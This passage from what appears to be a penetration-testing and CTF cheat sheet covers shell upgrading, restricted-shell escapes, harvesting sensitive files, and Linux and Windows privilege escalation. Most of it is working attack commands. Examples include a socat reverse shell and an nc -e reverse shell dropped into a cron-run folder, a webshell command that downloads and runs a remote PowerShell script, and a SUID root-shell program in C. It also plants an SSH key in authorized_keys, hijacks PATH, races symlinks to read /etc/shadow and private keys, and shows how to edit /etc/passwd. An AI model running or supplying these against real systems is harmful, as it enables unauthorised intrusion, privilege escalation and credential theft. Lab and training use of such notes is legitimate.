   lua: os.execute('/bin/sh')

IRB
^^^
(From within IRB)

.. code-block :: bash

  exec "/bin/sh"

VI
^^

(From within vi)

.. code-block :: bash 

  :!bash

(From within vi)

.. code-block :: bash 

  :set shell=/bin/bash:shell

Also, if we execute

::

  vi ;/bin/bash

Once, we exit vi, we would get shell. Helpful in scenarios where the user is asked to input which file to open.

Nmap
^^^^

(From within nmap)

.. code-block :: bash 

  !sh

Expect
^^^^^^

Using “Expect” To Get A TTY

.. code-block :: bash 

  $ cat sh.exp
  #!/usr/bin/expect
  # Spawn a shell, then allow the user to interact with it.
  # The new shell will have a good enough TTY to run tools like ssh, su and login
  spawn sh
  interact

Sneaky Stealthy SU in (Web) Shells
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Let's say we have a webshell on the server (probably, we would be logged in as a apache user), however, if we have credentials of another user, and we want to login we need a tty shell. We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell. 

**Example**

Webshell like

::

 http://IP/shell.php?cmd=id

If we try 

::

 echo password | su -c whoami

Probably will get

::

 standard in must be a tty

The su command would work from a terminal, however, would not take in raw stuff via the shell's Standard Input.
We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell

::

 (sleep 1; echo password) | python -c "import pty; pty.spawn(['/bin/su','-c','whoami']);"
 root

The above has been referenced from SANS `Sneaky Stealthy SU in (Web) Shells <https://pen-testing.sans.org/blog/2014/07/08/sneaky-stealthy-su-in-web-shells#>`_

Spawning a Fully Interactive TTYs Shell
---------------------------------------

`Ronnie Flathers <https://twitter.com/ropnop>`_ has already written a great blog on `Upgrading simple shells to fully interactive TTYs <https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/>`_ Hence, almost everything is taken from that blog and kept here for completion purposes.

Many times, we will not get a fully interactive shell therefore it will/ have: 

* Difficult to use the text editors like vim
* No tab-complete
* No up arrow history
* No job control

Socat
^^^^^

Socat can be used to pass full TTY's over TCP connections.

On Kali-Machine (Attackers - Probably yours)

::

 socat file:`tty`,raw,echo=0 tcp-listen:4444 

On Victim (launch):

::

 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  

If socat isn't installed, download standalone binaries that can be downloaded from `static binaries <https://github.com/andrew-d/static-binaries>`_ 

Download the correct binary architecture of socat to a writable directory, chmod it, execute

stty
^^^^

Use the methods mentioned in :ref:`spawning-a-tty-shell`

Once bash is running in the PTY, background the shell with Ctrl-Z
While the shell is in the background, examine the current terminal and STTY info so we can force the connected shell to match it

::
 
 echo $TERM
 xterm-256color

::

 stty -a
 speed 38400 baud; rows 59; columns 264; line = 0;
 intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V;   discard = ^O; min = 1; time = 0;
 -parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
 -ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8
 opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
 isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc

The information needed is the TERM type ("xterm-256color") and the size of the current TTY ("rows 38; columns 116")

With the shell still backgrounded, set the current STTY to type raw and tell it to echo the input characters with the following command:

::

 stty raw -echo 

With a raw stty, input/output will look weird and you won't see the next commands, but as you type they are being processed.

Next foreground the shell with fg. It will re-open the reverse shell but formatting will be off. Finally, reinitialize the terminal with reset.

After the reset the shell should look normal again. The last step is to set the shell, terminal type and stty size to match our current Kali window (from the info gathered above)

::

 $ export SHELL=bash
 $ export TERM=xterm256-color
 $ stty rows 38 columns 116

The end result is a fully interactive TTY with all the features we'd expect (tab-complete, history, job control, etc) all over a netcat connection

ssh-key
^^^^^^^

If we have some user shell or access, probably it would be a good idea to generate a new ssh private-public key pair using ssh-keygen

::

 ssh-keygen 
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/bitvijays/.ssh/id_rsa): 
 Enter passphrase (empty for no passphrase): 
 Enter same passphrase again: 
 Your identification has been saved in /home/bitvijays/.ssh/id_rsa.
 Your public key has been saved in /home/bitvijays/.ssh/id_rsa.pub.
 The key fingerprint is:
 SHA256:JbdAhAIPl8qm/kCANJcpggeVoZqWnFRvVbxu2u9zc5U bitvijays@Kali-Home
 The key's randomart image is:
 +---[RSA 2048]----+
 |o==*+. +=.       |
 |=o**+ o. .       |
 |=+...+  o +      |
 |=.* .    * .     |
 |oO      S .     .|
 |+        o     E.|
 |..      +       .|
 | ..    . . . o . |
 |  ..      ooo o  |
 +----[SHA256]-----+

Copy/ Append the public part to /home/user/.ssh/authorized_keys

::

 cat /home/bitvijays/.ssh/id_rsa.pub 

 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+tbCpnhU5qQm6typWI52FCin6NDYP0hmQFfag2kDwMDIS0j1ke/kuxfqfQKlbva9eo6IUaCrjIuAqbsZTsVjyFfjzo/hDKycR1M5/115Jx4q4v48a7BNnuUqi +qzUFjldFzfuTp6XM1n+Y1B6tQJJc9WruOFUNK2EX6pmOIkJ8QPTvMXYaxwol84MRb89V9vHCbfDrbWFhoA6hzeQVtI01ThMpQQqGv5LS+rI0GVlZnT8cUye0uiGZW7ek9DdcTEDtMUv1Y99zivk4FJmQWLzxplP5dUJ1NH5rm6YBH8CoQHLextWc36Ih18xsyzW8qK4Bfl4sOtESHT5/3PlkQHN bitvijays@Kali-Home" >> /home/user/.ssh/authorized_keys

Now, ssh to the box using that user.

::

 ssh user@hostname -i id_rsa

Restricted Shell
----------------

Sometimes, after getting a shell, we figure out that we are in restricted shell. The below has been taken from `Escaping Restricted Linux Shells <https://pen-testing.sans.org/blog/pen-testing/2012/06/06/escaping-restricted-linux-shells>`_, `Escape from SHELLcatraz <https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells>`_ 

Definition
^^^^^^^^^^
It limits a user's ability and only allows them to perform a subset of system commands. Typically, a combination of some or all of the following restrictions are imposed by a restricted shell:

* Using the 'cd' command to change directories.
* Setting or un-setting certain environment variables (i.e. SHELL, PATH, etc...).
* Specifying command names that contain slashes.
* Specifying a filename containing a slash as an argument to the '.' built-in command.
* Specifying a filename containing a slash as an argument to the '-p' option to the 'hash' built-in command.
* Importing function definitions from the shell environment at startup.
* Parsing the value of SHELLOPTS from the shell environment at startup.
* Redirecting output using the '>', '>|', ", '>&', '&>', and '>>' redirection operators.
* Using the 'exec' built-in to replace the shell with another command.
* Adding or deleting built-in commands with the '-f' and '-d' options to the enable built-in.
* Using the 'enable' built-in command to enable disabled shell built-ins.
* Specifying the '-p' option to the 'command' built-in.
* Turning off restricted mode with 'set +r' or 'set +o restricted 

Real shell implements restricted shells:

* rbash

  ::

   bash -r
   cd
   bash: cd: restricted

* rsh
* rksh

**Getting out of restricted shell**

Reconnaissance
^^^^^^^^^^^^^^

Find out information about the environment.

* Run env to see exported environment variables

* Run 'export -p' to see the exported variables in the shell. This would tell which variables are read-only. Most likely the PATH ($PATH) and SHELL ($SHELL) variables are '-rx', which means we can execute them, but not write to them. If they are writeable, we would be able to escape the restricted shell! 

 * If the SHELL variable is writeable, you can simply set it to your shell of choice (i.e. sh, bash, ksh, etc...). 
 * If the PATH is writeable, then you'll be able to set it to any directory you want. I recommend setting it to one that has commands vulnerable to shell escapes.

* Try basic Unix commands and see what's allowed ls, pwd, cd, env, set, export, vi, cp, mv etc.

Quick Wins
^^^^^^^^^^

* If '/' is allowed in commands just run /bin/sh
* If we can set PATH or SHELL variable
  ::

   export PATH=/bin:/usr/bin:/sbin:$PATH
   export SHELL=/bin/sh

  or if chsh command is present just change the shell to /bin/bash

  ::

   chsh
   password: <password will be asked>
   /bin/bash

* If we can copy files into existing PATH, copy
 
 ::

  cp /bin/sh /current/directory; sh

Taking help of binaries
^^^^^^^^^^^^^^^^^^^^^^^

Some commands let us execute other system commands, often bypassing shell restrictions

* ftp -> !/bin/sh
* gdb -> !/bin/sh
* more/ less/ man -> !/bin/sh
* vi -> :!/bin/sh : Refer `Breaking out of Jail : Restricted Shell <http://airnesstheman.blogspot.in/2011/05/breaking-out-of-jail-restricted-shell.html>`_ and `Restricted Accounts and Vim Tricks in Linux and Unix <http://linuxshellaccount.blogspot.in/2008/05/restricted-accounts-and-vim-tricks-in.html>`_ 
* scp -S /tmp/getMeOut.sh x y : Refer `Breaking out of rbash using scp <http://pentestmonkey.net/blog/rbash-scp>`_ 
* awk 'BEGIN {system("/bin/sh")}'
* find / -name someName -exec /bin/sh \;
* tee

 :: 

  echo "Your evil code" | tee script.sh

* Invoke shell thru scripting language

 * Python

  ::

   python -c 'import os; os.system("/bin/bash")

 * Perl

  ::

   perl -e 'exec "/bin/sh";'

SSHing from outside
^^^^^^^^^^^^^^^^^^^
* Use SSH on your machine to execute commands before the remote shell is loaded:

 ::

  ssh username@IP -t "/bin/sh"

* Start the remote shell without loading "rc" profile (where most of the limitations are often configured)
 
 ::

  ssh username@IP -t "bash --noprofile"


Getting out of rvim
^^^^^^^^^^^^^^^^^^^

Main difference of rvim vs vim is that rvim does not allow escape to shell with previously described techniques and, on top of that, no shell commands at all. Taken from `vimjail <https://ctftime.org/writeup/5784>`_

* To list all installed features it is possible to use ':version' vim command. 

 ::

  :version
  VIM - Vi IMproved 8.0 (2016 Sep 12, compiled Nov 04 2017 04:17:46)
  Included patches: 1-1257
  Modified by pkg-vim-maintainers@lists.alioth.debian.org
  Compiled by pkg-vim-maintainers@lists.alioth.debian.org
  Huge version with GTK2 GUI.  Features included (+) or not (-):
  +acl             +cindent         +cryptv          -ebcdic          +float           +job             +listcmds        +mouse_dec       +multi_byte      +persistent_undo  +rightleft       +syntax          +termresponse    +visual          +X11  
  +arabic          +clientserver    +cscope          +emacs_tags      +folding         +jumplist        +localmap        +mouse_gpm       +multi_lang      +postscript       +ruby            +tag_binary      +textobjects     +visualextra     -xfontset 
  +autocmd         +clipboard       +cursorbind      +eval            -footer          +keymap          +lua             -mouse_jsbterm   -mzscheme        +printer          +scrollbind      +tag_old_static  +timers          +viminfo         +xim
  +balloon_eval    +cmdline_compl   +cursorshape     +ex_extra        +fork()          +lambda          +menu            +mouse_netterm   +netbeans_intg   +profile          +signs           -tag_any_white   +title           +vreplace        +xpm
  +browse          +cmdline_hist    +dialog_con_gui  +extra_search    +gettext         +langmap         +mksession       +mouse_sgr       +num64           -python           +smartindent     +tcl             +toolbar         +wildignore      +xsmp_interact
  ++builtin_terms  +cmdline_info    +diff            +farsi           -hangul_input    +libcall         +modify_fname    -mouse_sysmouse  +packages        +python3          +startuptime     +termguicolors   +user_commands   +wildmenu        +xterm_clipboard
  +byte_offset     +comments        +digraphs        +file_in_path    +iconv           +linebreak       +mouse           +mouse_urxvt     +path_extra      +quickfix         +statusline      +terminal        +vertsplit       +windows         -xterm_save
  +channel         +conceal         +dnd             +find_in_path    +insert_expand   +lispindent      +mouseshape      +mouse_xterm     +perl            +reltime         - sun_workshop    +terminfo        +virtualedit     +writebackup
    system vimrc file: "$VIM/vimrc"


* Examining installed features and figure out which interpreter is installed.

* If python/ python3 has been installed

 ::

  :python3 import pty;pty.spawn("/bin/bash")

Gather information from files
-----------------------------

In case of LFI or unprivileged shell, gathering information could be very useful. Mostly taken from `g0tmi1k Linux Privilege Escalation Blog <https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>`_

Operating System
^^^^^^^^^^^^^^^^
::

  cat /etc/issue
  cat /etc/*-release
    cat /etc/lsb-release      # Debian based
    cat /etc/redhat-release   # Redhat based

/Proc Variables
^^^^^^^^^^^^^^^
::

 /proc/sched_debug	This is usually enabled on newer systems, such as RHEL 6.  It provides information as to what process is running on which cpu.  This can be handy to get a list of processes and their PID number.
 /proc/mounts		Provides a list of mounted file systems.  Can be used to determine where other interesting files might be located
 /proc/net/arp		Shows the ARP table.  This is one way to find out IP addresses for other internal servers.
 /proc/net/route	Shows the routing table information.
 /proc/net/tcp 
 /proc/net/udp  	Provides a list of active connections.  Can be used to determine what ports are listening on the server
 /proc/net/fib_trie	This is used for route caching.  This can also be used to determine local IPs, as well as gain a better understanding of the target's networking structure
 /proc/version	        Shows the kernel version.  This can be used to help determine the OS running and the last time it's been fully updated.

Each process also has its own set of attributes.  If we have the PID number and access to that process, then we can obtain some useful information about it, such as its environmental variables and any command line options that were run.  Sometimes these include passwords.  Linux also has a special proc directory called self which can be used to query information about the current process without having to know it's PID.

::

 /proc/[PID]/cmdline	Lists everything that was used to invoke the process. This sometimes contains useful paths to configuration files as well as usernames and passwords.
 /proc/[PID]/environ	Lists all the environment variables that were set when the process was invoked.  This also sometimes contains useful paths to configuration files as well as usernames and passwords.
 /proc/[PID]/cwd	Points to the current working directory of the process.  This may be useful if you don't know the absolute path to a configuration file.
 /proc/[PID]/fd/[#]	Provides access to the file descriptors being used.  In some cases this can be used to read files that are opened by a process.

The information about Proc variables has been taken from `Directory Traversal, File Inclusion, and The Proc File System <https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/>`_

Environment Variables
^^^^^^^^^^^^^^^^^^^^^

::

 cat /etc/profile
 cat /etc/bashrc
 cat ~/.bash_profile
 cat ~/.bashrc
 cat ~/.bash_logout

Configuration Files
^^^^^^^^^^^^^^^^^^^

* Apache Web Server : Helps in figuring out the DocumentRoot where does your webserver files are?

 ::

   /etc/apache2/apache2.conf
   /etc/apache2/sites-enabled/000-default 

User History
^^^^^^^^^^^^

::

  ~/.bash_history
  ~/.nano_history
  ~/.atftp_history
  ~/.mysql_history
  ~/.php_history
  ~/.viminfo

Private SSH Keys / SSH Configuration
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

::

  ~/.ssh/authorized_keys : specifies the SSH keys that can be used for logging into the user account 
  ~/.ssh/identity.pub
  ~/.ssh/identity
  ~/.ssh/id_rsa.pub
  ~/.ssh/id_rsa
  ~/.ssh/id_dsa.pub
  ~/.ssh/id_dsa
  /etc/ssh/ssh_config  : OpenSSH SSH client configuration files
  /etc/ssh/sshd_config : OpenSSH SSH daemon configuration file


.. _unprivileged-shell-to-privileged-shell:

Unprivileged Shell to Privileged Shell
======================================

Probably, at this point of time, we would have unprivileged shell of user www-data. If you are on Windows, there are particular set of steps. If you are on linux, it would be a good idea to first check privilege escalation techniques from g0tm1lk blog such as if there are any binary executable with SUID bits, if there are any cron jobs running with root permissions. 

If you have become a normal user of which you have a password, it would be a good idea to check sudo -l (for every user! Yes, even for www-data) to check if there are any executables you have permission to run.

Windows Privilege Escalation
----------------------------

If you have a shell/ meterpreter from a windows box, probably, the first thing would be to utilize

SystemInfo
^^^^^^^^^^
Run system info and findout 

* Operating System Version
* Architecture : Whether x86 or x64.
* Hotfix installed

The below system is running x64, Windows Server 2008 R2 with no Hotfixes installed.
::

 systeminfo

 Host Name:                 VICTIM-MACHINE
 OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
 OS Version:                6.1.7600 N/A Build 7600
 OS Manufacturer:           Microsoft Corporation
 OS Configuration:          Standalone Server
 OS Build Type:             Multiprocessor Free
 Registered Owner:          Windows User
 Registered Organization:
 Product ID:                00496-001-0001283-84782
 Original Install Date:     18/3/2017, 7:04:46 ��
 System Boot Time:          7/11/2017, 3:13:00 ��
 System Manufacturer:       VMware, Inc.
 System Model:              VMware Virtual Platform
 System Type:               x64-based PC
 Processor(s):              2 Processor(s) Installed.
                            [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
                            [02]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
 BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016
 Windows Directory:         C:\Windows
 System Directory:          C:\Windows\system32
 Boot Device:               \Device\HarddiskVolume1
 System Locale:             el;Greek
 Input Locale:              en-us;English (United States)
 Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
 Total Physical Memory:     2.048 MB
 Available Physical Memory: 1.640 MB
 Virtual Memory: Max Size:  4.095 MB
 Virtual Memory: Available: 3.665 MB
 Virtual Memory: In Use:    430 MB
 Page File Location(s):     C:\pagefile.sys
 Domain:                    HTB
 Logon Server:              N/A
 Hotfix(s):                 N/A
 Network Card(s):           1 NIC(s) Installed.
                            [01]: Intel(R) PRO/1000 MT Network Connection
                                  Connection Name: Local Area Connection
                                  DHCP Enabled:    No
                                  IP address(es)
                                  [01]: 10.54.98.9


If there are no Hotfixes installed, we can visit 

::

 C:\Windows\SoftwareDistribution\Download

This directory is the temporary location for WSUS. Updates were downloaded here, doesn't mean were installed. Otherwise, we may visit 

::

 C:\Windows\WindowUpdate.log 

which will inform if any hotfixes are installed.

Metasploit Local Exploit Suggestor
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Metasploit local_exploit_suggester : The module suggests local meterpreter exploits that can be used. The exploits are suggested based on the architecture and platform that the user has a shell opened as well as the available exploits in meterpreter.

  .. Note :: It is utmost important that the meterpreter should be of the same architecture as your target machine, otherwise local exploits may fail. For example. if you have target as windows 64-bit machine, you should have 64-bit meterpreter.

Sherlock and PowerUp Powershell Script
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

* `Sherlock <https://github.com/rasta-mouse/Sherlock>`_ PowerShell script by rastamouse to quickly find missing software patches for local privilege escalation vulnerabilities. If the Metasploit local_exploit_suggester didn't resulted in any exploits. Probably, try Sherlock Powershell script to see if there any vuln which can be exploited.

* `PowerUp <https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc>`_ : PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.

The above can be executed by 

::

 view-source:10.54.98.X/shell.php?cmd=echo IEX (New-Object Net.WebClient).DownloadString("http://YourIP:8000/Sherlock.ps1"); | powershell -noprofile -

 We execute powershell with noprofile and accept the input from stdin

Windows Exploit Suggestor
^^^^^^^^^^^^^^^^^^^^^^^^^
`Windows Exploit Suggestor <https://github.com/GDSSecurity/Windows-Exploit-Suggester>`_ : This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins. Just copy the systeminfo information from the windows OS and compare the database.

If we are getting the below error on running local exploits of getuid in meterpreter

::

 [-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getuid: Operation failed: Access is denied.

Possibly, migrate into a new process using post/windows/manage/migrate

Windows Kernel Exploits
^^^^^^^^^^^^^^^^^^^^^^^

`Windows Kernel Exploits <https://github.com/SecWiki/windows-kernel-exploits>`_ contains most of the compiled windows exploits. One way of running these is either upload these on victim system and execute. Otherwise, create a smb-server using Impacket

::

 usage: smbserver.py [-h] [-comment COMMENT] [-debug] [-smb2support] shareName sharePath

 This script will launch a SMB Server and add a share specified as an argument. You need to be root in order to bind to port 445. No authentication will be enforced. Example: smbserver.py -comment 'My share' TMP /tmp

 positional arguments:
   shareName         name of the share to add
   sharePath         path of the share to add


Assuming, the current directory contains our compiled exploit, we can

::

 impacket-smbserver <sharename> `pwd`
 Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

 [*] Config file parsed
 [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
 [*] Config file parsed
 [*] Config file parsed
 [*] Config file parsed

Once, smbserver is up and running, we can execute code like

::

 view-source:VictimIP/shell.php?cmd=\\YourIP\ShareName\ms15-051x64.exe whoami

 *Considering shell.php is our php oneliner to execute commands.


Abusing Token Privileges
^^^^^^^^^^^^^^^^^^^^^^^^

If we have the windows shell or meterpreter, we can type "whoami /priv" or if we have meterpreter, we can type "getprivs"

If we have any of the below privileges, we can possibly utilize `Rotten Potato <https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/>`_ 

::

 SeImpersonatePrivilege
 SeAssignPrimaryPrivilege
 SeTcbPrivilege
 SeBackupPrivilege
 SeRestorePrivilege
 SeCreateTokenPrivilege
 SeLoadDriverPrivilege
 SeTakeOwnershipPrivilege
 SeDebugPrivilege


The above was for the Windows OS and the below is for Linux OS.


Linux Privilege Escalation
--------------------------

Techniques for Linux privilege escalation:

Privilege escalation from g0tm1lk blog
--------------------------------------

Once, we have got the unprivileged shell, it is very important to check the below things

* Are there any binaries with Sticky, suid, guid.
* Are there any world-writable folders, files.
* Are there any world-execuable files.
* Which are the files owned by nobody (No user)
* Which are the files which are owned by a particular user but are not present in their home directory. (Mostly, the users have files and folders in /home directory. However, that's not always the case.)
* What are the processes running on the machines? (ps aux). Remember, If something like knockd is running, we would come to know that Port Knocking is required.
* What are the packages installed? (dpkg -l). Maybe some vulnerable application is installed ready to be exploited (For example: chkroot version 0.49).
* What are the services running? (netstat -ln)
* Check the entries in the crontab!
* What are the files present in the /home/user folder? Are there any hidden files and folders? like .thunderbird/ .bash_history etc.


What "Advanced Linux File Permissions" are used?
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Sticky bits, SUID & GUID

::

   find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
   find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
   find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.

   find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
   for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

   # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
    find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
 
Where can written to and executed from?
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

A few 'common' places: /tmp, /var/tmp, /dev/shm

::

  find / -writable -type d 2>/dev/null      # world-writeable folders
  find / -perm -222 -type d 2>/dev/null     # world-writeable folders
  find / -perm -o w -type d 2>/dev/null     # world-writeable folders
  find / -perm -o w -type f 2>/dev/null     # world-writeable files

  find / -perm -o x -type d 2>/dev/null     # world-executable folders
  find / -perm -o x -type f 2>/dev/null     # world-executable files

  find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders


Any "problem" files?
^^^^^^^^^^^^^^^^^^^^

Word-writeable, "nobody" files

::

  find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
  find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files

Find files/ folder owned by the user
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

After compromising the machine with an unprivileged shell, /home would contains the users present on the system. Also, viewable by checking /etc/passwd. Many times, we do want to see if there are any files owned by those users outside their home directory.

::

  find / -user username 2> /dev/null
  find / -group groupname 2> /dev/null


.. Tip :: Find files by wheel/ adm users or the users in the home directory.

Other Linux Privilege Escalation
--------------------------------

Execution of binary from Relative location than Absolute
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
If we figure out that a suid binary is running with relative locations (for example let's say backjob is running "id" and "scp /tmp/special ron@ton.home")(figured out by running strings on the binary). The problem with this is, that it’s trying to execute a file/script/program on a RELATIVE location (opposed to an ABSOLUTE location like /sbin would be). And we will now exploit this to become root.

Something like this:

::

 system("/usr/bin/env echo and now what?");

so we can create a file in temp:

::

  echo "/bin/sh" >> /tmp/id
  chmod +x /tmp/id

:: 

  www-data@yummy:/tmp$ echo "/bin/sh" >> /tmp/id
  www-data@yummy:/tmp$ export PATH=/tmp:$PATH
  www-data@yummy:/tmp$ which id
  /tmp/id
  www-data@yummy:/tmp$ /opt/backjob
  whoami
  root
  # /usr/bin/id
  uid=0(root) gid=0(root) groups=0(root),33(www-data)

By changing the PATH prior executing the vulnerable suid binary (i.e. the location, where Linux is searching for the relative located file), we force the system to look first into /tmp when searching for “scp” or "id" . So the chain of commands is: 

* /opt/backjob switches user context to root (as it is suid) and tries to run “scp or id”
* Linux searches the filesystem according to its path (here: in /tmp first)
* Our malicious /tmp/scp or /tmp/id gets found and executed as root 
* A new bash opens with root privileges.

If we execute a binary without specifying an absolute paths, it goes in order of your $PATH variable. By default, it's something like:

::

  /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

It is important to see .bash_profile file which contains the $PATH

Environment Variable Abuse
^^^^^^^^^^^^^^^^^^^^^^^^^^^

If the suid binary contains a code like

::

   asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
   printf("about to call system(\"%s\")\n", buffer);
   system(buffer);

We can see that it is accepting environment variable USER which can be user-controlled. In that case just define USER variable to

::

 USER=";/bin/sh;"

When the program is executed, USER variable will contain /bin/sh and will be executed on system call.

::

 echo $USER
 ;/bin/sh;
 
 levelXX@:/home/flagXX$ ./flagXX
 about to call system("/bin/echo ;/bin/sh; is cool")

 sh-4.2$ id
 uid=997(flagXX) gid=1003(levelXX) groups=997(flagXX),1003(levelXX)

World-Writable Folder with a Script executing any file in that folder using crontab
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

If there exists any world-writeable folder plus if there exists a cronjob which executes any script in that world-writeable folder such as 

::

 #!/bin/sh

 for i in /home/flagXX/writable.d/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
 done

then either we can create a script in that folder /home/flagXX/writeable.d which gives us a reverse shell like

::

 echo "/bin/nc.traditional -e /bin/sh 192.168.56.1 22" > hello.sh

or 

we can create a suid file to give us the privileged user permission

::

 #!/bin/sh
 gcc /var/tmp/shell.c -o /var/tmp/flagXX
 chmod 4777 /var/tmp/flagXX

Considering shell.c contains

::

 int main(void) {
 setgid(0); setuid(0);
 execl("/bin/sh","sh",0); }


Symlink Creation
^^^^^^^^^^^^^^^^

Multiple time, we would find that a suid binary belonging to another user is authorized to read a particular file. For example Let's say there's a suid binary called readExampleConf which can read a file named example.conf as a suid user. This binary can be tricked into reading any other file by creating a Symlink or a softlink. For example if we want to read /etc/shadow file which can be read by suid user. we can do

::

 ln -s /etc/shadow /home/xxxxxx/example.conf
 ln -s /home/xxx2/.ssh/id_rsa /home/xxxxxxx/example.conf

Now, when we try to read example.conf file, we would be able to read the file for which we created the symlink

::

 readExampleConf /home/xxxxxxx/example.conf
 <Contents of shadow or id_rsa>

Directory Symlink
^^^^^^^^^^^^^^^^^

Let's see what happens when we create a symlink of a directory

::

 ln -s /etc/ sym_file
 ln -s /etc/ sym_fold/

Here the first one create a direct symlink to the /etc folder and will be shown as 

::

 sym_file -> /etc/

where as in the second one ( ln -s /etc/ sym_fold/ ), we first create a folder sym_fold and then create a symlink

::

 sym_fold:
 total 0
 lrwxrwxrwx 1 bitvijays bitvijays 5 Dec  2 19:31 etc -> /etc/

This might be useful to bypass some filtering, when let's say a cronjob is running but refuses to take backup of anything named /etc . In that case, we can create a symlink inside a folder and take the backup. 

Time of check to time of use
^^^^^^^^^^^^^^^^^^^^^^^^^^^^

In Unix, if a binary program such as below following C code (uses access to check the access of the specific file and open to open a specific file), when used in a setuid program, has a TOCTTOU bug:

::


 if (access("file", W_OK) != 0) {
   exit(1);
 }

 fd = open("file", O_WRONLY);
 //read over /etc/shadow
 read(fd, buffer, sizeof(buffer));
 
Here, access is intended to check whether the real user who executed the setuid program would normally be allowed to write the file (i.e., access checks the real userid rather than effective userid). This race condition is vulnerable to an attack:

Attacker

::

 // 
 //
 // After the access check
 symlink("/etc/shadow", "file");
 // Before the open, "file" points to the password database
 //
 //


In this example, an attacker can exploit the race condition between the access and open to trick the setuid victim into overwriting an entry in the system password database. TOCTTOU races can be used for privilege escalation, to get administrative access to a machine.

Let's see how we can exploit this?

In the below code, we are linking the file which we have access (/tmp/hello.txt) and the file which we want to read (and currently don't have access) (/home/flagXX/token). The f switch on ln makes sure we overwrite the existing symbolic link. We run it in the while true loop to create the race condition.

::

  while true; do ln -sf /tmp/hello.txt /tmp/token; ln -sf /home/flag10/token /tmp/token ; done

We would also run the program in a while loop

::

 while true; do ./flagXX /tmp/token 192.168.56.1 ; done

Learning:

Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.” 

Writable /etc/passwd or account credentials came from a legacy unix system
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

* Passwords are normally stored in /etc/shadow, which is not readable by users. However, historically, they were stored in the world-readable file /etc/passwd along with all account information. 
* For backward compatibility, if a password hash is present in the second column in /etc/passwd, it takes precedence over the one in /etc/shadow. 
* Also, an empty second field in /etc/passwd means that the account has no password, i.e. anybody can log in without a password (used for guest accounts). This is sometimes disabled. 
* If passwordless accounts are disabled, you can put the hash of a password of your choice. You can use the crypt function to generate password hashes, for example

 ::
    
   perl -le 'print crypt("foo", "aa")' to set the password to foo. 

